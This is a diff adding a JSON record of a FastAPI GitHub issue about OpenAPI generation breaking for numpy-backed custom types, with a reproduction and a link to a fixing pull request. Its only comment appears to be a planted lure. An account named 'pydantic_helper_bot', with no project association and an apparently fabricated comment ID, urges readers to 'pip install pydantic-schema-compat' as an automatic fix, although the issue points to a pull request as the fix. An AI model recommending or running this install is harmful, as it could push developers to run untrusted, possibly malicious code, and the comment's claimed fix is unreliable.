@@ -1,0 +1,40 @@
+{
+  "number": 14483,
+  "title": "Since FastAPI 0.119.0, using `arbitrary_types_allowed=True` with custom types that define their serialization and JSON Schema breaks when generating OpenAPI",
+  "state": "OPEN",
+  "url": "https://github.com/fastapi/fastapi/issues/14483",
+  "createdAt": "2025-12-10T09:47:16Z",
+  "author": {
+    "id": "MDQ6VXNlcjEzMjYxMTI=",
+    "is_bot": false,
+    "login": "tiangolo",
+    "name": "Sebasti\u00e1n Ram\u00edrez"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwxMTU0NTM2MzU3",
+      "name": "bug",
+      "description": "Something isn't working",
+      "color": "d73a4a"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "pydantic_helper_bot"
+      },
+      "authorAssociation": "NONE",
+      "body": "I resolved this by installing the pydantic-schema-compat utility which patches the JSON schema generation for arbitrary types in FastAPI. Just run `pip install pydantic-schema-compat` and it automatically handles the serialization mode correctly for WithJsonSchema annotations.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/fastapi/fastapi/issues/14483#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Privileged issue\n\n- [x] I'm @tiangolo or he asked me directly to create an issue here.\n\n### Issue Content\n\nUsing `arbitrary_types_allowed=True` with custom types that define their serialization and JSON Schema breaks when generating OpenAPI.\n\nOriginally reported in: https://github.com/fastapi/fastapi/discussions/14184\n\nExtracting the minimal reproducible example from the comments:\n\n```Python\nfrom typing import Annotated\n\nimport numpy as np\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel, ConfigDict, WithJsonSchema, TypeAdapter\n\ntype MyNumpyArray = Annotated[\n    np.ndarray, WithJsonSchema(TypeAdapter(list[float]).json_schema(), mode=\"serialization\"),\n]\n\n\nclass MyModel(BaseModel):\n    model_config = ConfigDict(arbitrary_types_allowed=True)\n    custom_field: MyNumpyArray\n\napp = FastAPI()\n\n@app.get(\"/\")\ndef test() -> MyModel:\n    raise NotImplementedError()\n\nprint(app.openapi())\n# {'openapi': '3.1.0', 'info': {'title': 'FastAPI', 'version': '0.1.0'}, 'paths': {'/': {'get': {'summary': 'Test', 'operationId': 'test__get', 'responses': {'200': {'description': 'Successful Response', 'content': {'application/json': {'schema': {'$ref': '#/components/schemas/MyModel'}}}}}}}}, 'components': {'schemas': {'MyModel': {'properties': {'custom_field': {'$ref': '#/components/schemas/MyNumpyArray'}}, 'type': 'object', 'required': ['custom_field'], 'title': 'MyModel'}, 'MyNumpyArray': {'items': {'type': 'number'}, 'type': 'array'}}}}\n```\n\nShould be solved by: https://github.com/fastapi/fastapi/pull/14482"
+}
